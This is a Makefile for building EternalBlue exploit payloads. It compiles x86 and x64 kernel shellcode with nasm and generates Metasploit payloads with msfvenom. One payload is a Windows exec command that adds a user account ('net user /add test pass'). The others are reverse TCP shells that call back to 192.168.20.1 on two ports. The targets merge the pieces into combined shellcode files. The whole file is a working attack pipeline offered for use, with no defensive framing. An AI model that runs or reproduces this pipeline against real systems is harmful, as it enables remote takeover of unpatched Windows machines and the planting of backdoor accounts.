# Exec ayload arguments
EXEC_CMD="net user /add test pass"

# Reverse shell arguments
ip=192.168.20.1
portOne=25422
portTwo=25423

prepare_exec: clean generate_exec_payload merge_exec
prepare_reverse: clean generate_reverse_shell_payload merge_reverse

compile_kernel_shellcode: build 
	echo Compiling exploit shellcode
	nasm -f bin eternalblue_kshellcode_x64.asm -o build/sc_x64_kernel.bin
	nasm -f bin eternalblue_kshellcode_x86.asm -o build/sc_x86_kernel.bin

generate_exec_payload: build
	echo generating windows exec shellcode with command $(EXEC_CMD)  
	msfvenom -p windows/exec -f raw -o build/sc_x86_msf.bin CMD=$(EXEC_CMD)
	msfvenom -p windows/x64/exec -f raw -o build/sc_x64_msf.bin CMD=$(EXEC_CMD)

generate_reverse_shell_payload: build
	echo generating windows reverse shell payload
	msfvenom -p windows/x64/shell/reverse_tcp -f raw -o build/sc_x64_msf.bin EXITFUNC=thread LHOST=$(ip) LPORT=$(portOne)
	msfvenom -p windows/shell/reverse_tcp -f raw -o build/sc_x86_msf.bin EXITFUNC=thread LHOST=$(ip) LPORT=$(portTwo)

merge_payloads: build compile_kernel_shellcode
	cat build/sc_x64_kernel.bin build/sc_x64_msf.bin > build/sc_x64.bin
	cat build/sc_x86_kernel.bin build/sc_x86_msf.bin > build/sc_x86.bin
	
merge_exec: merge_payloads
	python eternalblue_sc_merge.py build/sc_x86.bin build/sc_x64.bin exec_sc_all.bin

merge_reverse: merge_payloads
	python eternalblue_sc_merge.py build/sc_x86.bin build/sc_x64.bin reverse_shell_sc_all.bin

build:
	mkdir build

clean: 
	rm -Rf build
	rm -f *.bin